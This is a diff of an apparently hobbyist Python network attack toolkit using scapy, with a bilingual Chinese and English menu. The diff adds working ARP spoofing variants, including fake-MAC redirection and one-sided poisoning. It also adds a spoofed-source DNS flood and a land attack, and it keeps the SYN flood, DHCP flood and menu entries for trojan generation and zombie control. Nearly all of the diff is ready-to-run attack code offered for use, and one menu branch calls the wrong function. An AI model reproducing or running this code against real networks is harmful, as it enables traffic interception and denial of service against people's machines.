@@ -59,7 +59,7 @@ print("|__/ |__/ |__/ \_______/|__/      |__/  \__/ \______/|______/ \______/ |_
 print("+-------------------------------------+------------------------+")
 print("|  MEN                                |  STR                   |")
 print("+-------------------------------------+------------------------+")
-print("|   0x000189abaa                      |         MOV 341 ACC    |")
+print("|   0x000189abaa                      |         MOV 540 ACC    |")
 print("|   0x000189abab                      |         PYTHON         |")
 print("+-------------------------------------+------------------------+")
 print("|             github:www.github.com/marko1616                  |")
@@ -93,67 +93,126 @@ print("password list read...Done")
 
 user_list = ["root"]
 
-def ARP_poof_with_not_ARPping():#ARP欺骗不带ARPPing
+class ARP_poof():
+    def ARP_poof_with_not_ARPping(self):#ARP欺骗不带ARPPing
 
-    if chinses_mode:
-        target = input("请输入目标IP地址:")  # 目标输入不用我多说把。
-        router = input("请输入网关IP地址:")
-    else:
-        target = input("Enter the target IP like 127.0.0.1:")
-        router = input("Please enter the router IP address like 192.168.1.1:")
+        if chinses_mode:
+            target = input("请输入目标IP地址:")  # 目标输入不用我多说把。
+            router = input("请输入网关IP地址:")
+        else:
+            target = input("Enter the target IP like 127.0.0.1:")
+            router = input("Please enter the router IP address like 192.168.1.1:")
 
-    packet = Ether()/ARP(psrc=router,pdst=target)#生成攻击数据包
-    packet_two = Ether()/ARP(psrc=target,pdst=router)
+        packet = Ether()/ARP(psrc=router,pdst=target)#生成攻击数据包
+        packet_two = Ether()/ARP(psrc=target,pdst=router)
 
-    while True:#攻击主循环
-        try:
-            sendp(packet)
-            sendp(packet_two)
-        except KeyboardInterrupt:
-            break
-
-def ARP_poof(): #ARP欺骗带ARPPing(内网用)。 PS:ARPPing用来确认主机是否存活
-
-    if chinses_mode:
-        target = input("请输入目标IP地址:")  # 目标输入不用我多说把。
-        router = input("请输入网关IP地址:")
-    else:
-        target = input("Enter the target IP like 127.0.0.1:")
-        router = input("Please enter the router IP address like 192.168.1.1:")
-
-    arp_Ping_fall = False#初始化变量
-    arp_test = False
-    arp_test_two = False
-
-    print("Try to arpPing the target...")
-    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff;ff")/ARP(pdst=target),timeout=1000)#ARPPing(arp目标扫描) PS:不知道为什么有时会失效。
-    for snd,rcv in ans:
-        print("arpPing...Done")
-        print(rcv.sprintf("%Ether.src% - %ARP.psrc%"))
-        arp_test = True
-
-    print("Try to arpPing the router...")
-    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff;ff")/ARP(pdst=router),timeout=1000)#康康上面的注释。
-    for snd,rcv in ans:
-        print("arpPing...Done")
-        print(rcv.sprintf("%Ether.src% - %ARP.psrc%"))
-        arp_test_two = True
-
-    if arp_test == False or arp_test_two == False:
-        arp_Ping_fall = True
-        print("ARP ping fall.")
-
-    packet = Ether()/ARP(psrc=router,pdst=target)#生成攻击数据包
-    packet_two = Ether()/ARP(psrc=target,pdst=router)
-
-    while True:#攻击主循环
-        try:
-            if arp_Ping_fall:
+        while True:#攻击主循环
+            try:
+                sendp(packet)
+                sendp(packet_two)
+                time.sleep(1)
+            except KeyboardInterrupt:
                 break
-            sendp(packet)
-            sendp(packet_two)
-        except KeyboardInterrupt:
-            break
+
+    def ARP_poof(self): #ARP欺骗带ARPPing(内网用)。 PS:ARPPing用来确认主机是否存活
+
+        if chinses_mode:
+            target = input("请输入目标IP地址:")  # 目标输入不用我多说把。
+            router = input("请输入网关IP地址:")
+        else:
+            target = input("Enter the target IP like 127.0.0.1:")
+            router = input("Please enter the router IP address like 192.168.1.1:")
+
+        arp_Ping_fall = False#初始化变量
+        arp_test = False
+        arp_test_two = False
+
+        print("Try to arpPing the target...")
+        ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff;ff")/ARP(pdst=target),timeout=1000)#ARPPing(arp目标扫描) PS:不知道为什么有时会失效。
+        for snd,rcv in ans:
+            print("arpPing...Done")
+            print(rcv.sprintf("%Ether.src% - %ARP.psrc%"))
+            arp_test = True
+
+        print("Try to arpPing the router...")
+        ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff;ff")/ARP(pdst=router),timeout=1000)#康康上面的注释。
+        for snd,rcv in ans:
+            print("arpPing...Done")
+            print(rcv.sprintf("%Ether.src% - %ARP.psrc%"))
+            arp_test_two = True
+
+        if arp_test == False or arp_test_two == False:
+            arp_Ping_fall = True
+            print("ARP ping fall.")
+
+        packet = Ether()/ARP(psrc=router,pdst=target)#生成攻击数据包
+        packet_two = Ether()/ARP(psrc=target,pdst=router)
+
+        while True:#攻击主循环
+            try:
+                if arp_Ping_fall:
+                    break
+                sendp(packet)
+                sendp(packet_two)
+                time.sleep(1)
+            except KeyboardInterrupt:
+                break
+
+    def ARP_poof_with_fake_MAC(self):
+        if chinses_mode:
+            target = input("请输入目标IP地址:")  # 目标输入不用我多说把。
+            router = input("请输入网关IP地址:")
+            redirect_MAC = input("请输入你想要把数据包重定向到的MAC:")
+        else:
+            target = input("Enter the target IP like 127.0.0.1:")
+            router = input("Please enter the router IP address like 192.168.1.1:")
+            redirect_MAC = input("Please enter redirect MAC:")
+
+        packet = Ether()/ARP(psrc=target,pdst=router,hwsrc=redirect_MAC)
+        packet_two = Ether()/ARP(psrc=router,pdst=target,hwsrc=redirect_MAC)
+
+        while True:#攻击主循环
+            try:
+                sendp(packet)
+                sendp(packet_two)
+                time.sleep(1)
+            except KeyboardInterrupt:
+                break
+
+    def ARP_poof_just_target(self):
+        if chinses_mode:
+            target = input("请输入目标IP地址:")  # 目标输入不用我多说把。
+            router = input("请输入网关IP地址:")
+        else:
+            target = input("Enter the target IP like 127.0.0.1:")
+            router = input("Please enter the router IP address like 192.168.1.1:")
+
+        packet = Ether()/ARP(psrc=router,pdst=target)
+
+        while True:#攻击主循环
+            try:
+                sendp(packet)
+                time.sleep(1)
+            except KeyboardInterrupt:
+                break
+
+    def ARP_poof_just_router(self):
+        if chinses_mode:
+            target = input("请输入目标IP地址:")  # 目标输入不用我多说把。
+            router = input("请输入网关IP地址:")
+
+        else:
+            target = input("Enter the target IP like 127.0.0.1:")
+            router = input("Please enter the router IP address like 192.168.1.1:")
+
+        packet = Ether()/ARP(psrc=target,pdst=router)
+
+        while True:#攻击主循环
+            try:
+                sendp(packet)
+                time.sleep(1)
+            except KeyboardInterrupt:
+                break
 
 def SYN_flood(): #SYN flood attack SYN洪水不用我说把
     if chinses_mode:
@@ -168,6 +227,15 @@ def SYN_flood(): #SYN flood attack SYN洪水不用我说把
             send(IP(src=RandIP(),dst=target)/TCP(dport=int(port), flags="S"))#生成&发送攻击数据包
         except KeyboardInterrupt:
             break
+        except OSError:
+            if chinses_mode:
+                print("你输入的地址不符合IP格式。")
+                time.sleep(1)
+                break
+            else:
+                print("The address you entered does not conform to the IP format.")
+                time.sleep(1)
+                break
 
 def nmap_port_scan():#nmap扫描所有端口状态
     if chinses_mode:
@@ -236,7 +304,16 @@ def read_pcap():
     else:
         file_name = input("Enter the pcap file name like 2019_11_02_16_55_22.pcap:")#输入pcap文件名
     file_name = "sniff_data/" + file_name#组合文件路径
-    reader = PcapReader(file_name)#用scapy打开pcap文件
+
+    try:
+        reader = PcapReader(file_name)#用scapy打开pcap文件
+    except FileNotFoundError:
+        if chinses_mode:
+            print("找不到文件")
+        else:
+            print("Can nod find the file")
+        return
+
     packets = reader.read_all(-1)#读取所有储存的数据包
     for i in packets:#循环数据包列表
         i.show()#打印数据包
@@ -303,42 +380,80 @@ def trace_router():
     res, unans = traceroute(target, dport=dport, retry=-2)
     time.sleep(1)
 
+def DNS_pollution():
+    if chinses_mode:
+        dst_ip = input("请输入需要导向的IP:")
+    else:
+        dst_ip = input(":")
+    while True:
+        try:
+            send(IP(dst=dst_ip, src="192.168.3.1")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="s96.cnzz.com")), verbose=0)
+        except KeyboardInterrupt:
+            break
+
+def land_attack():
+    if chinses_mode:
+        target = input("请输入目标IP")
+    else:
+        target = input("Enter the target IP:")
+    while True:
+        try:
+            send(IP(src=target, dst=target) / TCP(sport=135, dport=135))
+        except KeyboardInterrupt:
+            break
+        except OSError:
+            if chinses_mode:
+                print("你输入的地址不符合IP格式。")
+                time.sleep(1)
+                break
+            else:
+                print("The address you entered does not conform to the IP format.")
+                time.sleep(1)
+                break
+
 if chinses_mode:
     print("启动用了", time.time() - tick, "秒。")
 else:
     print("Setup in ", time.time() - tick, "seconds.")#初始化计时
+
+arps_poof = ARP_poof()
+
 while True:#喜闻乐见的主循环
     os_command = False
-    tool_number = 13
-    print("如果要选择插件请输入插件名字")
+    tool_number = 15
+    if chinses_mode:
+        print("如果要选择插件请输入插件名字")
+
     if not chinses_mode:
         print("quit(0)")#告诉用户对应的功能
-        print("ARPspoof with ARPPing.(1)")
+        print("ARPspoof(1)")
         print("SYN flood(2)")
         print("All port status scans(3)")
         print("Death of Ping(4)")
         print("Sniff(5)")
         print("Read Save pcap file(6)")
-        print("ARPspoof with not ARPPing(7)")
-        print("macof(8)")
-        print("DHCP flood(9)")
-        print("Generate trojan virus(10)")
-        print("Control zombie computer(11)")
-        print("Trace router(12)")
+        print("macof(7)")
+        print("DHCP flood(8)")
+        print("Generate trojan virus(9)")
+        print("Control zombie computer(10)")
+        print("Trace router(11)")
+        print("DNS pollution(12)")
+        print("land attack(13)")
     if chinses_mode:
         print("退出(0)")
-        print("ARP欺骗带ARPPing(内网用)。(1)")
+        print("ARP欺骗(1)")
         print("SYN洪水(2)")
         print("所有端口状态扫描(3)")
         print("死亡之Ping(4)")
         print("sniff嗅探(5)")
         print("读取已保存的pcap文件 注:推荐使用Wireshark(6)")
-        print("ARP欺骗不带ARPPing版(7)")
-        print("伪macof(8)")
-        print("DHCP洪水(9)")
-        print("生成木马病毒(10)")
-        print("控制肉鸡(11)")
-        print("路由跟踪(12)")
+        print("伪macof(7)")
+        print("DHCP洪水(8)")
+        print("生成木马病毒(9)")
+        print("控制肉鸡(10)")
+        print("路由跟踪(11)")
+        print("DNS污染(12)")
+        print("land攻击(这个攻击很古老了 13)")
     print("------------------pulgins-------------------")
     for i in plugins_list:
         print(i + "(" + str(tool_number) + ")")
@@ -353,7 +468,41 @@ while True:#喜闻乐见的主循环
     if choose == 0:#无聊的判断时间 PS:这里想吐槽python没有什么关键字你知道了把。
         sys.exit(0)
     elif choose == 1:#时刻提醒自己要两的等于号。
-        ARP_poof()
+        if chinses_mode:
+            print("ARP欺骗带ARPPing(1)")
+            print("ARP欺骗(2)")
+            print("ARP欺骗使用假的MAC(不能用来中间人 3)")
+            print("ARP欺骗只影响目标(4)")
+            print("ARP欺骗只影响网关(5)")
+        else:
+            print("ARP poof with ARP ping(1)")
+            print("ARP poof(2)")
+            print("ARP poof with fake MAC(3)")
+            print("ARP poof just poof target(4)")
+            print("ARP poof just poof router(5)")
+
+        choose = input(">>>")
+
+        try:
+            choose = int(choose)
+        except ValueError:
+            if chinses_mode:
+                print("请输入数字")
+            else:
+                print("You must enter a int")
+
+
+        if choose == 1:
+            arps_poof.ARP_poof()
+        elif choose == 2:
+            arps_poof.ARP_poof_with_not_ARPping()
+        elif choose == 3:
+            arps_poof.ARP_poof_with_fake_MAC()
+        elif choose == 4:
+            arps_poof.ARP_poof_just_router()
+        elif choose == 5:
+            arps_poof.ARP_poof_just_router()
+
     elif choose == 2:#没一个选择对应一个函数
         SYN_flood()
     elif choose == 3:
@@ -365,17 +514,19 @@ while True:#喜闻乐见的主循环
     elif choose == 6:
         read_pcap()
     elif choose == 7:
-        ARP_poof_with_not_ARPping()
-    elif choose == 8:
         macof()
-    elif choose == 9:
+    elif choose == 8:
         DHCP_flood()
-    elif choose == 10:
+    elif choose == 9:
         Generate_trojan_virus()
-    elif choose == 11:
+    elif choose == 10:
         countrol_zombie_computer()
-    elif choose == 12:
+    elif choose == 11:
          trace_router()
+    elif choose == 12:
+        DNS_pollution()
+    elif choose == 13:
+        land_attack()
     else:
         os_command = True
 
